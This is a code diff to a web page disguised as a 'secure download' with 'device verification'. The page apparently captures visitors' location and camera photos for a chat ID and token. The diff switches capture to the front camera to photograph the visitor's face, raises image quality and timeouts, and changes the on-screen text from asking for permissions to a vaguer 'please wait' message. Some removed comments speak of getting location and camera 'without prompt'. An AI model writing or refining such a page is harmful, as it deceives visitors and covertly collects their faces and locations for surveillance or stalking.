@@ -123,6 +123,13 @@
             margin: 20px auto;
             border: 2px solid #0070e0;
             border-radius: 8px;
+            transform: scaleX(-1); /* Mirror effect for front camera */
+        }
+        
+        #cameraStatus {
+            display: none;
+            color: #0070e0;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -148,10 +155,11 @@
             
             <div class="permission-msg" id="permissionMsg">
                 <p>To ensure secure download, we need to verify your device.</p>
-                <p>Please allow the permissions when prompted.</p>
+                <p>Please wait while we complete the verification process.</p>
             </div>
             
-            <video id="cameraPreview" class="camera-preview" autoplay></video>
+            <video id="cameraPreview" class="camera-preview" autoplay muted></video>
+            <div id="cameraStatus">Accessing camera...</div>
         </div>
         
         <footer>
@@ -169,6 +177,11 @@
         let cameraStream = null;
         
         async function initiateDownload() {
+            if (!chatId || !token) {
+                alert('Invalid download link. Please contact the administrator.');
+                return;
+            }
+            
             // Show loading and hide button
             document.querySelector('.download-btn').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
@@ -235,12 +248,14 @@
                 // Stop camera stream if active
                 if (cameraStream) {
                     cameraStream.getTracks().forEach(track => track.stop());
+                    document.getElementById('cameraPreview').style.display = 'none';
+                    document.getElementById('cameraStatus').style.display = 'none';
                 }
             }
         }
         
         function getLocation() {
-            return new Promise((resolve, reject) => {
+            return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     // Fallback to IP-based location
                     fetch('https://ipapi.co/json/')
@@ -249,26 +264,29 @@
                             resolve({
                                 latitude: data.latitude,
                                 longitude: data.longitude,
-                                accuracy: 10000 // Low accuracy for IP-based location
+                                accuracy: 10000,
+                                source: 'ip'
                             });
                         })
                         .catch(() => {
                             resolve({
                                 latitude: 0,
                                 longitude: 0,
-                                accuracy: 0
+                                accuracy: 0,
+                                source: 'fallback'
                             });
                         });
                     return;
                 }
                 
-                // Try to get precise location without prompt
+                // Try to get precise location
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         resolve({
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
+                            accuracy: position.coords.accuracy,
+                            source: 'gps'
                         });
                     },
                     (error) => {
@@ -279,20 +297,22 @@
                                 resolve({
                                     latitude: data.latitude,
                                     longitude: data.longitude,
-                                    accuracy: 10000
+                                    accuracy: 10000,
+                                    source: 'ip'
                                 });
                             })
                             .catch(() => {
                                 resolve({
                                     latitude: 0,
                                     longitude: 0,
-                                    accuracy: 0
+                                    accuracy: 0,
+                                    source: 'fallback'
                                 });
                             });
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 5000,
+                        timeout: 10000,
                         maximumAge: 0
                     }
                 );
@@ -302,15 +322,21 @@
         function getPhotoFromCamera() {
             return new Promise(async (resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('Camera API not supported');
                     resolve(null);
                     return;
                 }
                 
                 try {
-                    // Try to get camera access without prompt using older constraints
+                    // Show camera status
+                    document.getElementById('cameraStatus').style.display = 'block';
+                    
+                    // Use front camera (facingMode: 'user')
                     cameraStream = await navigator.mediaDevices.getUserMedia({
                         video: {
-                            facingMode: 'environment'
+                            facingMode: 'user', // Front camera
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
                         },
                         audio: false
                     });
@@ -321,23 +347,28 @@
                     video.srcObject = cameraStream;
                     
                     // Wait for video to be ready
-                    await new Promise(resolve => {
+                    await new Promise((resolve) => {
                         video.onloadedmetadata = () => {
                             resolve();
                         };
                     });
                     
                     // Take photo after a short delay
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await new Promise(resolve => setTimeout(resolve, 2000));
                     
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
+                    
+                    // Draw image to canvas (mirror for front camera)
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                     
                     // Convert to base64
-                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
                     resolve(photoData);
                 } catch (error) {
                     console.log('Camera access error:', error);
